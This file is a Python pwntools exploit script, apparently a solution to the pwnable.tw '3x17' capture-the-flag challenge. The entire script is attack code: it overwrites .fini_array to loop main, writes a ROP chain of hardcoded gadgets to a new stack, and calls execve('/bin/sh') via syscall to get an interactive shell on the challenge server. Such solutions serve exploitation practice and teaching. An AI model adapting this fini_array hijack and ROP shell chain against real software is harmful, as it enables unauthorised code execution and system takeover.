#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft

c = remote('chall.pwnable.tw', 10105)
# c = process('./3x17')

context.os='linux'
context.terminal = ['alacritty', '-e', 'sh', '-c']

gdbcmd = '''source /usr/share/peda/peda.py
#b *0x401be1
#b *0x401c2e
# b *0x446e2c
# b *0x0402960
# b *0x0401c4b

# ret nop break point
b *0x401016
# syscall bp
b *0x00000000004022b4
'''

# gdb.attach(c, gdbcmd)
context.log_level ='debug'

ret_nop = 0x0000000000401016 # ret

new_stack = 0x4b4100
shell_str = 0x4b40f0 - 8

# loop
ans = str(0x4b40f0 - 8).zfill(24).encode()
ans += flat({0: '/bin/sh'}, filler = b'\0', length = 8)
ans += p64(0x402960) # .fini_array[0] __libc_csu_fini
ans += p64(0x401b6d) # .fini_array[1] main

# Preparing ROP
def layout(index, a, b, c):
    global new_stack
    ans = b''
    ans += str(new_stack + 8 * 3 * index).zfill(24).encode()
    ans += p64(a) + p64(b) + p64(c)
    return ans


ans += layout(0, ret_nop, ret_nop, ret_nop)

# execve(shell_str, 0, 0)
# rax = 0x3b, rdi= shell_str, rsi = 0, rdx = 0
ans += layout(1,
        0x000000000041e4af, # pop rax ; ret
        0x3b, # rax
        ret_nop
        )

ans += layout(2,
        0x000000000044a309, # pop rdx ; pop rsi ; ret
        0, # rdx
        0, # rsi
        )

ans += layout(3,
        0x0000000000401696, # pop rdi ; ret
        shell_str, # rdi
        0x00000000004022b4, # syscall
        )

# leave ; ret
ans += str(0x4b40f0).zfill(24).encode()
ans += p64(0x0401c4b) # leave ; ret
ans += p64(ret_nop)
ans += p64(ret_nop)


c.send(ans)

c.interactive()
c.close()

